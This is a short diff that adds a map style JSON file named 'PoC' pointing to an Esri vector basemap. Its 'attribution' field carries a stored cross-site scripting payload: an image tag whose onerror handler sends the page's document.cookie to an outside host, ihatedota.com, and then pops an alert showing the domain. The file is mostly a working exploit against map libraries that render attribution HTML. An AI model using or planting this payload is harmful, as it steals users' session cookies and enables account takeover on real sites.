@@ -1,0 +1,14 @@
+{
+  "version": 8,
+  "name": "PoC",
+  "sources": {
+    "esri": {
+      "type": "vector",
+      "attribution": "<img src=x onerror=\"fetch('https://ihatedota.com/x?c='+encodeURIComponent(document.cookie)).then(()=>alert('XSS @ '+document.domain))\">",
+      "url": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer"
+    }
+  },
+  "layers": [],
+  "glyphs": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/fonts/{fontstack}/{range}.pbf",
+  "sprite": "https://basemaps-api.arcgis.com/arcgis/rest/services/World_Basemap_v2/VectorTileServer/resources/sprites/sprite"
+}
